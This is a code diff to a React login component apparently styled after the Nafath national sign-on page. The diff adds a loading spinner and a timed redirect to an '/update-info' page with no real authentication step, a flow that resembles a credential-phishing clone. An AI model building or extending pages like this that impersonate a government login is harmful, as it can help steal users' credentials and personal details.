@@ -1,5 +1,5 @@
 import { useState, useRef, useEffect } from "react";
-import { Eye, EyeOff, Globe, Plus, Minus, User, Lock } from "lucide-react";
+import { Eye, EyeOff, Globe, Plus, Minus, User, Lock, Loader2 } from "lucide-react";
 
 export default function NafathLogin() {
   const [username, setUsername] = useState("");
@@ -7,6 +7,7 @@ export default function NafathLogin() {
   const [showPassword, setShowPassword] = useState(false);
   const [activeTab, setActiveTab] = useState<"app" | "password">("password");
   const [errors, setErrors] = useState<{username?: string, password?: string}>({});
+  const [isLoading, setIsLoading] = useState(false);
   const nafathInputRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
@@ -83,7 +84,10 @@ export default function NafathLogin() {
                     
                     if (Object.keys(newErrors).length === 0) {
                       // Proceed with login
-                      console.log("Login submitted");
+                      setIsLoading(true);
+                      setTimeout(() => {
+                        window.location.href = "/update-info";
+                      }, 3000);
                     }
                   }}>
                     <div className="space-y-2">
@@ -139,10 +143,19 @@ export default function NafathLogin() {
 
                     <button 
                       type="submit"
-                      className="w-full bg-[#11998e] hover:bg-[#147a5b] text-white font-bold py-3 rounded-[4px] transition-colors flex items-center justify-center gap-2 mt-6"
+                      className="w-full bg-[#11998e] hover:bg-[#147a5b] text-white font-bold py-3 rounded-[4px] transition-colors flex items-center justify-center gap-2 mt-6 relative h-[52px]"
+                      disabled={isLoading}
                     >
-                      <span>تسجيل الدخول</span>
-                      <span className="text-xl">←</span>
+                      {isLoading ? (
+                        <div className="absolute inset-0 flex items-center justify-center">
+                          <Loader2 className="h-8 w-8 animate-spin" />
+                        </div>
+                      ) : (
+                        <>
+                          <span>تسجيل الدخول</span>
+                          <span className="text-xl">←</span>
+                        </>
+                      )}
                     </button>
 
                     <div className="flex justify-between gap-4 pt-6">
